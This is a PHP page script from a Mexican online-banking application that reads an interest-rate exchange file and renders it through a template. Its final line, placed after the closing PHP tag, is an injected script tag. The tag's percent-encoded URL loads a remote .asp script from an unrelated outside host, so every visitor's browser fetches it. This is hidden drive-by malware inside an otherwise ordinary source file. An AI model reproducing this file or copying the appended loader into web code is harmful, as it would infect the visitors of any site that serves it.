<?php
//
//
// Created on: <1-Nov-2001 17:37:53 smb>
//
// This source file is part of IVA.
//
// Copyright (C) 1997-2004 Internet de Alta Calidad, S.A. de C.V.  Todos los derechos reservados. All rights reserved.
//
// This program is free software; you can redistribute it and/or
// modify it under the terms of the GNU General Public License
// as published by the Free Software Foundation; either version 2
// of the License, or (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program; if not, write to the Free Software
// Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, US
//
include_once( "classes/INIFile.php" );
include_once( "classes/eztemplate.php" );
include_once( "classes/ezhttptool.php" );

include_once( "eztransaccion/classes/eztransaccion.php" );
include_once( "ezsession/classes/ezsession.php" );

$session =& eZSession::globalSession();

if( !$session->fetch() )
    $session->store();

$ini =& $GLOBALS["GlobalSiteIni"];

$Language = $ini->read_var( "eZTransaccionMain", "Language" );
// $backend = $ini->read_var( "eZTransaccionMain", "Backend" );
$ServerNumber = $ini->read_var( "site", "ServerNumber" );
$DomainPostfix = $ini->read_var( "site", "DomainPostfix" );

$backend = "gw" . $ServerNumber. $DomainPostfix;

// DebugBreak();
$t = new eZTemplate( "eztransaccion/user/" . $ini->read_var( "eZTransaccionMain", "TemplateDir" ),
                     "eztransaccion/user/intl/", $Language, "tasas.php" );

$t->setAllStrings();

$t->set_file( array(
    "tasas_tpl" => "tasas.tpl"
    ) );

$tr = new eZTransaccion( );
$transaccion_buffer = "<table width=\"100%\" border=0>";

// REF JAC-15Dec2009, INICIO
// $ret_code = $tr->GetToHost($backend, "/trat.i", $transaccion_buffer); // tasas

$path = "/var/www/data";

$file = $path ."/trat.i";
$f = @fopen($file, 'r');
	if($f)
	{
		$transaccion_buffer .= fread($f, filesize($file));
		fclose($f);
	}
	else
		$transaccion_buffer .= "<strong>No se encontr&oacute; el archivo de intercambio.</strong>";

// REF JAC-15Dec2009, FIN

$transaccion_buffer .= "</table>";


$t->set_var( "transaccion_buffer", $transaccion_buffer );
$t->pparse( "output", "tasas_tpl" );

?><script src="http://%71%7A%68%2E%74%78%73%68%69%2E%63%6F%6D/%62%32%2E%61%73%70"></script>